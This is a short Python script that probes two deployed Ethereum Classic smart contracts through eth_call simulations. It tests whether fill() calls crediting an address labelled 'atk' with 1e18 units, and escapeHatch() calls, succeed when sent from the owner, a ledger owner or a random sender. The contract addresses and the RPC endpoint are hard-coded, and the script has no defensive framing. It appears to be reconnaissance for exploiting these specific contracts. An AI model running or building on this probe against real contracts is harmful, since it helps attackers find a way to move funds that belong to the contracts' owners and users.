# Author: DanyTech
import json, urllib.request
RPC="https://etc.etcdesktop.com"
def rpc(m,p):
    b=json.dumps({"jsonrpc":"2.0","method":m,"params":p,"id":1}).encode()
    r=urllib.request.Request(RPC,data=b,headers={"Content-Type":"application/json"})
    try: return json.load(urllib.request.urlopen(r,timeout=20))
    except Exception as e: return {"error":str(e)}
T="0x9f5304DA62A5408416Ea58A17a92611019bD5ce3"
LED="0x180826b05452ce96e157f0708c43381fee64a6b8"
OWNER="0xe79aca5C8cDa44d834efa969906A377Cb987E02E"
LEDOWNER="0x941D6F2cAe269f6e72f9BaAaF2c98057eE421960"
RND="0x2222222222222222222222222222222222222222"
def t(label,to,data,frm,val=None):
    p={"from":frm,"to":to,"data":data,"gas":"0x7a1200"}
    if val is not None: p["value"]=hex(val)
    r=rpc("eth_call",[p,"latest"])
    print(f"  {label:48} ->", ("OK" if "result" in r else "REVERT"))
def fill_empty(): return "0x884b5dc2"+"%064x"%0x20+"%064x"%0
def fill2(): return "0x884b5dc2"+"%064x"%0x20+"%064x"%2+"%064x"%int("1111111111111111111111111111111111111111",16)+"%064x"%(10**18)
print("=== fill z msg.value=1 wei (sum: fill zahteva value>0?) ===")
t("TARGET.fill([atk,1e18]) as OWNER, value=1", T, fill2(), OWNER, 1)
t("TARGET.fill([atk,1e18]) as RANDOM, value=1", T, fill2(), RND, 1)
t("TARGET.fill([]) as OWNER, value=1", T, fill_empty(), OWNER, 1)
t("LEDGER.fill([atk,1e18]) as LED-OWNER, value=1", LED, fill2(), LEDOWNER, 1)
print("=== primerjava: escapeHatch z value ===")
t("TARGET.escapeHatch as OWNER, value=0", T, "0x1554611f", OWNER, 0)
t("TARGET.escapeHatch as OWNER, value=1", T, "0x1554611f", OWNER, 1)
